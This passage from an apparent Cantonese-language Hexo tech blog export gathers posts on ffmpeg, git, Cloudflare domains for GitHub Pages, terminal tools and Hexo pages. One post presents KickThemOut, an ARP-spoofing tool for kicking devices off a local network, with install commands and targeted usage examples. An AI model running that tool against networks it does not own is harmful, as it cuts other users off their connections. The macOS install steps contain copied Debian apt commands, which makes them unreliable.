    如果是這樣的格式 <code>-frames:v 1 sc.jpg</code> 那麼就算你將 <code>-frames:v 1</code> 改為 <code>-frames:v 50</code> 也是沒有反應。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg -i inputvideo.mp4 -ss 00:00:10 -frames:v 1 sc.jpg</span><br></pre></td></tr></table></figure>

<img src="/2021/12/11/ffmpeg-command/op.png" class="">

<h3 id="輸出多張圖片"><a href="#輸出多張圖片" class="headerlink" title="輸出多張圖片"></a>輸出多張圖片</h3><p>此方法為輸出多個圖片，因為要輸出多張圖片, 我們需要更改指令上的 <code>output</code> 讓它自動格式化輸出的檔案名稱。</p>
<p>以下指令說明 :</p>
<ul>
<li><code>-i</code> inputvideo.mp4 (你要 Screenshot 的檔案)</li>
<li><code>-ss</code> 00:00:10 (影片內你要 Screensoht 的秒數)</li>
<li><code>-frames:v</code> 50 (輸出圖片數量)</li>
<li><code>sc_%3d.jpg</code> (輸出檔案名稱)</li>
</ul>
<div class="note info flat">
    說明：由影片 <code>inputvideo.mp4</code> 播放第 10 秒時開始截取之後的 50 個影格 (<code>-frames:v 50</code>) , 輸出共 50 張圖片。
</div>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg -i inputvideo.mp4 -ss 00:00:10 -frames:v 50 sc_%3d.jpg</span><br></pre></td></tr></table></figure>

<img src="/2021/12/11/ffmpeg-command/output.png" class="">

<h5 id="d-說明"><a href="#d-說明" class="headerlink" title="%d 說明"></a><strong><span style="font-size:larger;">%d 說明</span></strong></h5><p>這個是有關 Programming 的語法。</p>
<h5 id="d-0-位數"><a href="#d-0-位數" class="headerlink" title="%d 0 位數"></a><strong><span style="font-size:larger;">%d 0 位數</span></strong></h5><p>我以上述指令來說明，你可以只輸入 %d，<br>得出來的結果是這樣 :  <code>1,2,3,4,5,6,7,8,9,10,10,11</code>。</p>
<img src="/2021/12/11/ffmpeg-command/d.png" class="">

<h5 id="d-3-位數"><a href="#d-3-位數" class="headerlink" title="%d 3 位數"></a><strong><span style="font-size:larger;">%d 3 位數</span></strong></h5><p>如果你輸入 %3d，那麼就代表會將檔案名稱預設會輸入 3 位數，<br>得出來的結果是這樣 : <code>001,002,003,004,005,006,007,008,009,010</code>。</p>
<img src="/2021/12/11/ffmpeg-command/ddd.png" class="">


<h5 id="d-4-位數"><a href="#d-4-位數" class="headerlink" title="%d 4 位數"></a><strong><span style="font-size:larger;">%d 4 位數</span></strong></h5><p>所以如果是輸入 %4d，<br>得出來的結果是這樣 : <code>0001,0002,0003,0004,0005,0006,0007,0008,0009,0010</code>。</p>
<img src="/2021/12/11/ffmpeg-command/dddd.png" class="">

<h1 id="合成檔案"><a href="#合成檔案" class="headerlink" title="合成檔案"></a>合成檔案</h1><p>合成檔案是指將 <code>影片一</code> 和 <code>影片二</code> 和者合成，變成一個檔案，會使用到 <code>concat</code> 的指令。</p>
<h2 id="建立文字檔"><a href="#建立文字檔" class="headerlink" title="建立文字檔"></a>建立文字檔</h2><p>首先我們需要新增一個檔案，這樣做是為了讀取文字檔的內容，免了在同一句的指令當中輸入檔案全名。</p>
<p>文字檔名稱：<code>video.txt</code></p>
<p>文字檔內容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">video1.mp4</span><br><span class="line">video2.mp4</span><br><span class="line">video3.mp4</span><br><span class="line">video4.mp4</span><br></pre></td></tr></table></figure>

<h2 id="輸入指令合成"><a href="#輸入指令合成" class="headerlink" title="輸入指令合成"></a>輸入指令合成</h2><p>建立後我們輸入以下指令將他合成：</p>
<div class="note info flat">
    使用 <code>-f concat</code> 合成影片。
</div>

<div class="note warning flat">
    注意：如果檔案名稱有空白鍵或者有中文因而出現錯誤 <code>unsafe file name</code>，你需要使用多一個參數令他正常運行：<code>-safe 0</code>，記得是放在 <code>-i</code> 前面。  
</div>

<p>普通 <code>-f</code> concat 示範：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg.exe -f concat -i .\video.txt -c copy final.mp4</span><br></pre></td></tr></table></figure>


<p>-safe 0 concat 示範：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffmpeg.exe -f concat -safe 0 -i .\video.txt -c copy final.mp4</span><br></pre></td></tr></table></figure>

<p>參考資料:<br><a href="https://superuser.com/questions/277642/how-to-merge-audio-and-video-file-in-ffmpeg">https://superuser.com/questions/277642/how-to-merge-audio-and-video-file-in-ffmpeg</a><br><a href="https://itectec.com/superuser/how-to-merge-audio-and-video-file-in-ffmpeg/">https://itectec.com/superuser/how-to-merge-audio-and-video-file-in-ffmpeg/</a><br><a href="https://ottverse.com/thumbnails-screenshots-using-ffmpeg/">https://ottverse.com/thumbnails-screenshots-using-ffmpeg/</a><br><a href="https://stackoverflow.com/questions/35526253/how-do-i-add-a-cover-image-to-a-mp4-file-with-ffmpeg">https://stackoverflow.com/questions/35526253/how-do-i-add-a-cover-image-to-a-mp4-file-with-ffmpeg</a><br><a href="https://stackoverflow.com/questions/54717175/how-do-i-add-a-custom-thumbnail-to-a-mp4-file-using-ffmpeg">https://stackoverflow.com/questions/54717175/how-do-i-add-a-custom-thumbnail-to-a-mp4-file-using-ffmpeg</a><br><a href="https://stackoverflow.com/questions/14423647/ffmpeg-remove-cover-picture-from-mp3-convert-to-ogg-without-cover">https://stackoverflow.com/questions/14423647/ffmpeg-remove-cover-picture-from-mp3-convert-to-ogg-without-cover</a></p>
]]></content>
      <categories>
        <category>FFMPEG</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>Cheat Sheet</tag>
      </tags>
  </entry>
  <entry>
    <title>Git - 操作指南</title>
    <url>/2022/01/09/git-commands/</url>
    <content><![CDATA[<h1 id="基本指令"><a href="#基本指令" class="headerlink" title="基本指令"></a>基本指令</h1><h3 id="clone"><a href="#clone" class="headerlink" title="clone"></a>clone</h3><p>你可以理解為下載 repo.</p>
<p>示範</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/torvalds/linux</span><br></pre></td></tr></table></figure>

<p>咁樣就下載哂成個 repo 既野。</p>
<h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><p>因為你本身既 Files 係未更新入去，要俾 git 知道你係要加呢個file。</p>
<p>示範 (加入全部檔案)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add *</span><br></pre></td></tr></table></figure>
<p>or</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add .</span><br></pre></td></tr></table></figure>

<p>兩樣都係一樣效果。</p>
<p>示範 (加入特定檔案)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add file.sh</span><br></pre></td></tr></table></figure>

<h3 id="status"><a href="#status" class="headerlink" title="status"></a>status</h3><p>將已加入既檔案等等唔同既野 list 出黎</p>
<p>如果加 -s 就會 display 已經修改過既檔名<br>如果再喺 加兩樣 -s-b 就會 display 分支既名。</p>
<p>示範</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure>

<h3 id="commit"><a href="#commit" class="headerlink" title="commit"></a>commit</h3><p>將你要 Push 既內容起個名，例如你呢次 Push 既野想叫做 version 0.1，<br>咁你當你想返轉頭睇 version 0.1 既內容，就方便你知道邊個打邊個。</p>
<p>示範</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git commit -m &quot;on99 0.1&quot;</span><br></pre></td></tr></table></figure>

<h3 id="push"><a href="#push" class="headerlink" title="push"></a>push</h3><p>將你既 file 放上去 github repo.</p>
<p>示範</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push -u origin</span><br></pre></td></tr></table></figure>

<h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><p>列出而加既 setting。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global --list</span><br></pre></td></tr></table></figure>

<p>set username 入cfg.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;your_username&quot;</span><br></pre></td></tr></table></figure>

<p>set email 入 cfg.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.email &quot;your_email_address@example.com&quot;</span><br></pre></td></tr></table></figure>

<h3 id="log"><a href="#log" class="headerlink" title="log"></a>log</h3><p>列出 <code>Repositories</code> 的 commit。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure>

<h1 id="Shell-Scipt-懶人-push-法"><a href="#Shell-Scipt-懶人-push-法" class="headerlink" title="Shell Scipt (懶人 push 法)"></a>Shell Scipt (懶人 push 法)</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> push.sh</span></span><br><span class="line"></span><br><span class="line">git add *</span><br><span class="line">git commit -m &quot;update&quot;</span><br><span class="line">git push -u origin</span><br></pre></td></tr></table></figure>

<p>咁你想 Push 既時候只要打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod u+x push.sh</span><br><span class="line">./push.sh</span><br></pre></td></tr></table></figure>

<p>參考資料:<br><a href="https://backlog.com/git-tutorial/tw/reference/basic.html">https://backlog.com/git-tutorial/tw/reference/basic.html</a></p>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Git - 更新</title>
    <url>/2022/01/30/git-console-update/</url>
    <content><![CDATA[<h1 id="點-update"><a href="#點-update" class="headerlink" title="點 update ?"></a>點 update ?</h1><p>呢個方法只係接受喺 <a href="https://git-scm.com/">git-scm</a> 下載既。<br>如果係用 Package Manager 就唔係咁更新。</p>
<p>只需要跟返你用緊既 Package manager，<br>再 upgrade 就得 ~</p>
<p>只需要打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git update</span><br></pre></td></tr></table></figure>

<img src="/2022/01/30/git-console-update/update.gif" class="">

<p>完 …</p>
<h2 id="git-scm"><a href="#git-scm" class="headerlink" title="git-scm"></a>git-scm</h2><p><a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a></p>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Github Page - 使用 Cloudflare 購買網域並套用至你的網站 (2022.7.5 版本)</title>
    <url>/2022/07/05/github-pages-add-your-custom-domain-cloudflare/</url>
    <content><![CDATA[<img src="/img/Post/image/Cloudflare/cloudflare-icon.svg" width="200px"/>

<h1 id="Github-Page-網址"><a href="#Github-Page-網址" class="headerlink" title="Github Page 網址"></a>Github Page 網址</h1><p>我們使用 Github Page 預設的網址會像這樣：<code>&lt;username&gt;.github.io</code>，<br>雖然有基本的功能，連線速度不錯，有免費的 SSL Cert，但是你不能使用自訂網域。<br>所以接下來我會教大家如何購買一個你專屬的網域並且套用至你的網站。</p>
<h2 id="Prerequisite"><a href="#Prerequisite" class="headerlink" title="Prerequisite"></a>Prerequisite</h2><ul>
<li>信用卡一張 (付錢買網域)</li>
<li>Cloudflare 帳號 (Free)</li>
<li>已有 github page (<code>&lt;username&gt;.github.io</code>)</li>
</ul>
<h1 id="Cloudflare"><a href="#Cloudflare" class="headerlink" title="Cloudflare"></a>Cloudflare</h1><p>Cloudflare 是一間美國 CDN 服務的一個大型企業，能提供專業的防 DDoS 服務，加強你網站的瀏覽速度等，其總部位於加利福尼亞州舊金山。</p>
<h1 id="首頁"><a href="#首頁" class="headerlink" title="首頁"></a>首頁</h1><p>在開始之前，請先登入你的 Cloudflare 帳號，如果沒有的話，請先申請一個。</p>
<p>登入後會看到這個頁面。</p>
<p><img src="1.gif"></p>
<h2 id="購買網域-第一步"><a href="#購買網域-第一步" class="headerlink" title="購買網域 - 第一步"></a>購買網域 - 第一步</h2><p>點擊左方的 <code>購買網域 (新的)</code> 然後再點擊 <code>註冊網域 (新的)</code>。</p>
<p><img src="2.gif"></p>
<h2 id="購買網域-第二步-尋找網域名稱"><a href="#購買網域-第二步-尋找網域名稱" class="headerlink" title="購買網域 - 第二步 (尋找網域名稱)"></a>購買網域 - 第二步 (尋找網域名稱)</h2><p>現在會看到 <code>Find a domain</code>，請輸入你想要的名稱，這個會作為你的網站名稱 ~<br>輸入完成確定想要這個名稱後請按下 <code>搜索</code> ~</p>
<p><img src="3.gif"></p>
<h2 id="購買網域-第三步-尋找想要的-TLDs"><a href="#購買網域-第三步-尋找想要的-TLDs" class="headerlink" title="購買網域 - 第三步 (尋找想要的 TLDs)"></a>購買網域 - 第三步 (尋找想要的 TLDs)</h2><p>此時會列出你輸入的名稱所存在的 TLDS 列表，列如 <code>.com</code> <code>.net</code> <code>.io</code> 等等，<br>但要注意每一個 <code>TLDs</code> 價錢也不一樣，就好像 <code>.com</code> 就是最便宜的 <code>TLDs</code>。</p>
<p>選擇一個你喜歡的就好。(<del>有錢的話不用煩</del>)</p>
<p><img src="4.gif"></p>
<h2 id="購買網域-第四步-輸入註冊者資訊"><a href="#購買網域-第四步-輸入註冊者資訊" class="headerlink" title="購買網域 - 第四步 (輸入註冊者資訊)"></a>購買網域 - 第四步 (輸入註冊者資訊)</h2><p>輸入你申請此網域的個人資訊。</p>
<p><img src="5.gif"></p>
<h2 id="購買網域-第四步-輸入信用卡號碼"><a href="#購買網域-第四步-輸入信用卡號碼" class="headerlink" title="購買網域 - 第四步 (輸入信用卡號碼)"></a>購買網域 - 第四步 (輸入信用卡號碼)</h2><p>輸入你付款的信用卡資料。</p>
<p><img src="6.gif"></p>
<h2 id="購買網域-第五步-網域購買完成"><a href="#購買網域-第五步-網域購買完成" class="headerlink" title="購買網域 - 第五步 (網域購買完成)"></a>購買網域 - 第五步 (網域購買完成)</h2><p>完成輸入後確定送出付款。<br>在付款的時候需要時間處理加密傳送 (大概 20秒)。</p>
<p><img src="7.gif"></p>
<h2 id="購買網域-已完成購買"><a href="#購買網域-已完成購買" class="headerlink" title="購買網域 - 已完成購買"></a>購買網域 - 已完成購買</h2><p>然後在首頁就會看到你剛剛購買的網域已經新增在主頁了 ~</p>
<p><img src="8.gif"><br><img src="8-2.gif"></p>
<h1 id="首頁-Cloudflare"><a href="#首頁-Cloudflare" class="headerlink" title="首頁 (Cloudflare)"></a>首頁 (Cloudflare)</h1><p>當我們購買完成後，我們還需要設置 DNS 相關的操作。</p>
<p><img src="8.gif"></p>
<h2 id="修改-DNS-設置-第一步"><a href="#修改-DNS-設置-第一步" class="headerlink" title="修改 DNS 設置 - 第一步"></a>修改 DNS 設置 - 第一步</h2><p>回到首頁後按下剛購買的網域。</p>
<p><img src="9.gif"></p>
<h2 id="修改-DNS-設置-第二步"><a href="#修改-DNS-設置-第二步" class="headerlink" title="修改 DNS 設置 - 第二步"></a>修改 DNS 設置 - 第二步</h2><p>點擊 <code>DNS</code>。</p>
<p><img src="10.gif"></p>
<h2 id="修改-DNS-設置-第三步"><a href="#修改-DNS-設置-第三步" class="headerlink" title="修改 DNS 設置 - 第三步"></a>修改 DNS 設置 - 第三步</h2><p>我們需要新增五條規則，如下圖。</p>
<ul>
<li>新增四個 <code>A</code> Records，<br>名稱為 <code>@</code> (你申請的網域)，<br>內容為 Github <a href="https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/managing-a-custom-domain-for-your-github-pages-site">官方文件提供</a> 的四個 IPV4 位置 <code>185.199.108-111.153</code>。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">185.199.108.153</span><br><span class="line">185.199.109.153</span><br><span class="line">185.199.110.153</span><br><span class="line">185.199.111.153</span><br></pre></td></tr></table></figure>

<ul>
<li>新增一個 <code>CNAME</code> Record，<br>名稱為 <code>www</code>，<br>內容為你的 <code>github page</code> 網址 <code>&lt;username&gt;.github.io</code>。 </li>
</ul>
<p><img src="11.gif"></p>
<h2 id="修改-DNS-設置-第三步-可選"><a href="#修改-DNS-設置-第三步-可選" class="headerlink" title="修改 DNS 設置 - 第三步 (可選)"></a>修改 DNS 設置 - 第三步 (可選)</h2><p>這邊是新增 IPV6 的規則，可選擇做還是不做，如果做的話請跟以下位置：</p>
<ul>
<li>新增四個 <code>AAAA</code> Records，<br>名稱為 <code>@</code> (你申請的網域)，<br>內容為 Github <a href="https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/managing-a-custom-domain-for-your-github-pages-site">官方文件提供</a> 提供的四個 IPV6 位置 <code>2606:50c0:8000-8003::153</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2606:50c0:8000::153</span><br><span class="line">2606:50c0:8001::153</span><br><span class="line">2606:50c0:8002::153</span><br><span class="line">2606:50c0:8003::153</span><br></pre></td></tr></table></figure>

<h1 id="Githuhb-repo-修改-DNS"><a href="#Githuhb-repo-修改-DNS" class="headerlink" title="Githuhb repo - 修改 DNS"></a>Githuhb repo - 修改 DNS</h1><p>現在我們需要新增你 repo 內的自訂網域，<br>登入你的 github，然後回到你的 repo。</p>
<p><img src="12.gif"></p>
<h2 id="修改-DNS-設置-第一步-開啟-Settings"><a href="#修改-DNS-設置-第一步-開啟-Settings" class="headerlink" title="修改 DNS 設置 - 第一步 (開啟 Settings)"></a>修改 DNS 設置 - 第一步 (開啟 Settings)</h2><p>按下你 repo 內的 <code>Settings</code>。</p>
<p><img src="13.gif"></p>
<h2 id="修改-DNS-設置-第二步-開啟-Pages"><a href="#修改-DNS-設置-第二步-開啟-Pages" class="headerlink" title="修改 DNS 設置 - 第二步 (開啟 Pages)"></a>修改 DNS 設置 - 第二步 (開啟 Pages)</h2><p>按下 <code>Setting</code> 內的 <code>Pages</code>。</p>
<p><img src="14.gif"></p>
<h2 id="修改-DNS-設置-第三步-Custom-domain"><a href="#修改-DNS-設置-第三步-Custom-domain" class="headerlink" title="修改 DNS 設置 - 第三步 (Custom domain)"></a>修改 DNS 設置 - 第三步 (Custom domain)</h2><p>於 Custom domain 輸入你購買的網域連結，然後按下 <code>Save</code>。<br>此時 Github Page 會進行 <code>DNS Check in Progress</code> 請耐心等待 ~</p>
<p><img src="15.gif"></p>
<h2 id="修改-DNS-設置-新增完成-顯示完成"><a href="#修改-DNS-設置-新增完成-顯示完成" class="headerlink" title="修改 DNS 設置 - 新增完成 (顯示完成)"></a>修改 DNS 設置 - 新增完成 (顯示完成)</h2><p>等待完成後會出現 <code>DNS check successful</code>。</p>
<p><img src="16.gif"></p>
<h2 id="修改-DNS-設置-新增完成-等待"><a href="#修改-DNS-設置-新增完成-等待" class="headerlink" title="修改 DNS 設置 - 新增完成 (等待)"></a>修改 DNS 設置 - 新增完成 (等待)</h2><p>輸入完成後回到你的 <code>repo</code> 會發現多了一個檔案叫 <code>CNAME</code>，而內容是你的網域。</p>
<p><img src="17.gif"></p>
<h2 id="完成-設置"><a href="#完成-設置" class="headerlink" title="完成 設置"></a>完成 設置</h2><p>此事此刻你輸入網域後就會發現已經成功，而你 <code>&lt;username&gt;.github.io</code> 也會重定向到你的網域。</p>
<h2 id="Hexo-CNAME"><a href="#Hexo-CNAME" class="headerlink" title="Hexo CNAME"></a>Hexo CNAME</h2><p>如果你是使用 Hexo 生成網頁，一定要在 <code>source</code> 目錄底下建立一個檔案，名為 <code>CNAME</code>，然後內容輸入你的網域。</p>
<p>這樣做的原因是為了讓 Hexo 每次 Push 上 github 的時候都會將你存在的檔案送上去，然後如果你本身檔案內沒有 <code>CNAME</code> 的話，那麼你再次上傳檔案的時候，因為你本機沒有 <code>CNAME</code>，此時網域就沒有了。所以這個步驟相當重要！</p>
<p><img src="CNAME.gif"></p>
]]></content>
      <categories>
        <category>Domain</category>
      </categories>
      <tags>
        <tag>Github Page</tag>
        <tag>Cloudflare</tag>
      </tags>
  </entry>
  <entry>
    <title>KickThemOut - 斷人上網既工具 (Private Network)</title>
    <url>/2022/01/15/github-tools-KickThemOut/</url>
    <content><![CDATA[<h1 id="介紹"><a href="#介紹" class="headerlink" title="介紹"></a>介紹</h1><p>一種將設備踢出網絡並為自己享受所有帶寬的工具。<br>它允許您選擇特定或所有設備，然後 ARP 將它們欺騙您的局域網。</p>
<ul>
<li>兼容 Python <strong>3+</strong> 🎉。</li>
<li><em>不</em>與 Windows 兼容。</li>
</ul>
<p>作者：<a href="mailto:nikolaskam@gmail.com">Nikolaos Kamarinakis</a> &amp; <a href="mailto:xdavid@protonmail.com">David Schütz</a>。</p>
<ul>
<li>Nikolaos Kamarinakis - <a href="https://twitter.com/nikolaskama">@nikolaskama</a></li>
<li>David Schütz - <a href="https://twitter.com/xdavidhu">@xdavidhu</a></li>
</ul>
<h1 id="安裝-Debian"><a href="#安裝-Debian" class="headerlink" title="安裝 (Debian)"></a>安裝 (Debian)</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">~ ❯❯❯ sudo apt-get update &amp;&amp; sudo apt-get install nmap</span><br><span class="line"></span><br><span class="line">~ ❯❯❯ git clone https://github.com/k4m4/kickthemout.git</span><br><span class="line"></span><br><span class="line">~ ❯❯❯ cd kickthemout/</span><br><span class="line"></span><br><span class="line">~/kickthemout ❯❯❯ sudo -H pip3 install -r requirements.txt</span><br><span class="line"></span><br><span class="line">~/kickthemout ❯❯❯ sudo python3 kickthemout.py</span><br></pre></td></tr></table></figure>

<h1 id="安裝-MacOS"><a href="#安裝-MacOS" class="headerlink" title="安裝 (MacOS)"></a>安裝 (MacOS)</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">~ ❯❯❯ sudo apt-get update &amp;&amp; sudo apt-get install nmap</span><br><span class="line"></span><br><span class="line">~ ❯❯❯ git clone https://github.com/k4m4/kickthemout.git</span><br><span class="line"></span><br><span class="line">~ ❯❯❯ cd kickthemout/</span><br><span class="line"></span><br><span class="line">~/kickthemout ❯❯❯ sudo -H pip3 install -r requirements.txt</span><br><span class="line"></span><br><span class="line">~/kickthemout ❯❯❯ sudo python3 kickthemout.py</span><br></pre></td></tr></table></figure>


<h1 id="安裝-Arch-Linux"><a href="#安裝-Arch-Linux" class="headerlink" title="安裝 (Arch Linux)"></a>安裝 (Arch Linux)</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">~ ❯❯❯ git clone https://github.com/k4m4/kickthemout.git</span><br><span class="line"></span><br><span class="line">~ ❯❯❯ cd kickthemout/</span><br><span class="line"></span><br><span class="line">~/kickthemout ❯❯❯ sudo -H pip3 install -r requirements.txt</span><br><span class="line"></span><br><span class="line">~/kickthemout ❯❯❯ sudo python3 kickthemout.py</span><br></pre></td></tr></table></figure>

<h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Usage: sudo python3 kickthemout.py [options]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --version             show program&#x27;s version number and exit</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -p PACKETS, --packets=PACKETS</span><br><span class="line">                        number of packets broadcasted per minute (default: 6)</span><br><span class="line">  -s, --scan            perform a quick network scan and exit</span><br><span class="line">  -t TARGETS, --target=TARGETS</span><br><span class="line">                        specify target IP address(es) and perform attack</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">  sudo python3 kickthemout.py --target 192.168.1.10 </span><br><span class="line">  sudo python3 kickthemout.py -t 192.168.1.5,192.168.1.10 -p 30</span><br><span class="line">  sudo python3 kickthemout.py (interactive mode)</span><br></pre></td></tr></table></figure>

<h2 id="查-Options"><a href="#查-Options" class="headerlink" title="查 Options"></a>查 Options</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">~/kickthemout ❯❯❯ sudo python3 kickthemout.py -h</span><br></pre></td></tr></table></figure>

<h2 id="Run-Program"><a href="#Run-Program" class="headerlink" title="Run Program"></a>Run Program</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo python3 kickthemout.py</span><br></pre></td></tr></table></figure>

<h2 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h2><img src="/2022/01/15/github-tools-KickThemOut/kickthemout.png" class="">

<h3 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h3><p>作者已經好耐冇更新，炸人機功能已經冇左，但係佢既 Scan Network 功能仲係好好用。</p>
]]></content>
      <categories>
        <category>Github Tools</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>MPS-Youtube - 免開 Browser 睇 Youtube (未打完)</title>
    <url>/2022/01/29/github-tools-mps-youtube/</url>
    <content><![CDATA[<h1 id="Linux-成癮"><a href="#Linux-成癮" class="headerlink" title="Linux 成癮"></a>Linux 成癮</h1><p>打指令打到痴撚左線，<br>睇 Youtube 都唔想開 browser，<br>咁就要用佢啦！</p>
<h2 id="MPS-Youtube"><a href="#MPS-Youtube" class="headerlink" title="MPS-Youtube"></a><a href="https://github.com/mps-youtube/mps-youtube">MPS-Youtube</a></h2><p>佢係一款用多功能集中於 Youtube 既工具</p>
<h2 id="功能包括有"><a href="#功能包括有" class="headerlink" title="功能包括有"></a>功能包括有</h2><ul>
<li>Search and play audio/video from YouTube</li>
<li>Search tracks of albums by album title</li>
<li>Search and import YouTube playlists</li>
<li>Create and save local playlists</li>
<li>Download audio/video</li>
<li>Convert to mp3 &amp; other formats (requires ffmpeg or avconv)</li>
<li>View video comments</li>
<li>Works with Python 3.x</li>
<li>Works with Windows, Linux and Mac OS X</li>
<li>Requires mplayer or mpv</li>
</ul>
]]></content>
      <categories>
        <category>Github Tools</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>wttr.in - 查天氣既工具</title>
    <url>/2021/12/17/github-tools-wttrin-weather/</url>
    <content><![CDATA[<h1 id="wttr-in"><a href="#wttr-in" class="headerlink" title="wttr.in"></a>wttr.in</h1><p>wttr.in 是一種面向控制台的天氣預報服務，它支持各種信息表示方法，例如用於控制台 HTTP 客戶端（curl、httpie 或 wget）的面向終端的 ANSI 序列、用於 Web 瀏覽器的 HTML 或用於圖形查看器的 PNG。</p>
<p>【Github】：<a href="https://github.com/chubin/wttr.in">https://github.com/chubin/wttr.in</a></p>
<h2 id="查現時位置天氣"><a href="#查現時位置天氣" class="headerlink" title="查現時位置天氣"></a>查現時位置天氣</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl wttr.in</span><br><span class="line">Weather <span class="keyword">for</span> City: Paris, France</span><br><span class="line"></span><br><span class="line">     \   /     Clear</span><br><span class="line">      .-.      10 – 11 °C  </span><br><span class="line">   ― (   ) ―   ↑ 11 km/h  </span><br><span class="line">      `-’      10 km  </span><br><span class="line">     /   \     0.0 mm  </span><br></pre></td></tr></table></figure>

<h2 id="查其他位置天氣"><a href="#查其他位置天氣" class="headerlink" title="查其他位置天氣"></a>查其他位置天氣</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># curl wttr.in/London</span></span><br></pre></td></tr></table></figure>

<p>搞撚掂 !</p>
<p><a href="https://lihkg.com/thread/2744877/page/1">https://lihkg.com/thread/2744877/page/1</a></p>
]]></content>
      <categories>
        <category>Github Tools</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo - 新增新的 Navbar 連結 (Page)</title>
    <url>/2022/06/16/hexo-add-page-navbar-link-aref/</url>
    <content><![CDATA[<img src="/img/Post/image/Hexo/cover.svg" width="200px"/>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Navbar 係講緊以下呢張圖既野，<br>今日呢篇文會講點樣喺 <code>Hexo</code> 新增一樣你想加既野。</p>
<ul>
<li>分類新增</li>
<li>文章新增</li>
</ul>
<img src="/2022/06/16/hexo-add-page-navbar-link-aref/navbar.png" class="">

<h1 id="Page-add"><a href="#Page-add" class="headerlink" title="Page add"></a>Page add</h1><p>首先我地好似平時咁用 Terminal 開返你個 blog 既位置先。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd your_blog</span><br></pre></td></tr></table></figure>

<h2 id="指令輸入"><a href="#指令輸入" class="headerlink" title="指令輸入"></a>指令輸入</h2><p>而加我地喺 Terminal 度咁樣打。</p>
<blockquote>
<p>說明 : 咁做既目標係新增一個 Page 叫做 <code>yoyo</code>。</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo new page yoyo</span><br></pre></td></tr></table></figure>

<h3 id="進入路徑"><a href="#進入路徑" class="headerlink" title="進入路徑"></a>進入路徑</h3><p>之後你就會發現喺呢個位置 <code>\blog\source\</code> 會多左個叫 <code>yoyo</code> 既 folder，<br>我地打開佢會再發現多左個 <code>md 檔</code> 叫 <code>index.md</code>，<br>我地將佢打開再由原本既 :</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">yoyo</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2022-06-16 07:21:00</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>

<h3 id="修改-md-檔"><a href="#修改-md-檔" class="headerlink" title="修改 md 檔"></a>修改 md 檔</h3><p>修改成咁 :</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">yoyo</span></span><br><span class="line"><span class="attr">date:</span> <span class="number">2022-06-16 17:30:23</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;yoyo&quot;</span></span><br><span class="line"><span class="meta">---</span></span><br></pre></td></tr></table></figure>


